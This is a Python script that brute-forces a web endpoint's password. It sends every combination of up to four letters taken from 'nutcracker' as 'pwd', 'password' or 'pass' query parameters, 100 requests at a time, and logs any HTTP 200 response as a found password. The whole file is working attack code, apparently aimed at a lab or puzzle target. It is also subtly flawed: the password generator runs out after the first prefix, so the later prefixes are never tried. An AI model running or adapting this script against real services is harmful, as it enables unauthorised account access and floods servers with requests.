import asyncio
import time
import aiohttp
from logger import logger
from itertools import product
from env import get_url

CONCURRENT_ATTEMPTS = 100

async def try_password(session, url, prefix, password):
    params = {prefix: password}
    try:
        async with session.get(url, params=params) as response:
            logger.debug(f"Trying password: {password} with prefix {prefix}, Status: {response.status}")
            return password, response.status
    except asyncio.TimeoutError:
        logger.debug(f"Timeout with password: {password}")
        return password, None

def generate_passwords(word, max_length):
    characters = set(word.lower() + word.upper())
    for length in range(1, max_length + 1):
        for combination in product(characters, repeat=length):
            yield ''.join(combination)

async def brute_force_password(session, url, passwords, prefixes_request):
    tasks = []
    total_requests = 0
    successful_attempts = 0
    failed_attempts = 0
    response_codes = []
    for prefix in prefixes_request:
        for password in passwords:
            tasks.append(try_password(session, url, prefix, password))
            if len(tasks) >= CONCURRENT_ATTEMPTS:
                results = await asyncio.gather(*tasks)
                for password, status in results:
                    total_requests += 1
                    response_codes.append((password, status))
                    if status == 200:
                        successful_attempts += 1
                        logger.critical(f"Password found: {password} with prefix {prefix}")
                    else:
                        failed_attempts += 1
                tasks = []  # Reset tasks once done
    if tasks:
        results = await asyncio.gather(*tasks)
        for password, status in results:
            total_requests += 1
            response_codes.append((password, status))
            if status == 200:
                successful_attempts += 1
                logger.critical(f"Password found: {password} with prefix {prefix}")
            else:
                failed_attempts += 1
    return None, total_requests, successful_attempts, failed_attempts, response_codes

async def main():
    url = get_url()
    word = "nutcracker"
    max_length = 4
    prefixes_request = ['pwd', 'password', 'pass']
    all_passwords = generate_passwords(word, max_length)
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        _, total_requests, successful_attempts, failed_attempts, response_codes = await brute_force_password(session, url, all_passwords, prefixes_request)
        time_elapsed = time.time() - start_time

        logger.critical(f"Total requests: {total_requests}")
        logger.critical(f"Successful attempts: {successful_attempts}")
        logger.critical(f"Failed attempts: {failed_attempts}")
        logger.critical(f"Time taken: {time_elapsed:.2f} seconds")

if __name__ == '__main__':
    asyncio.run(main())
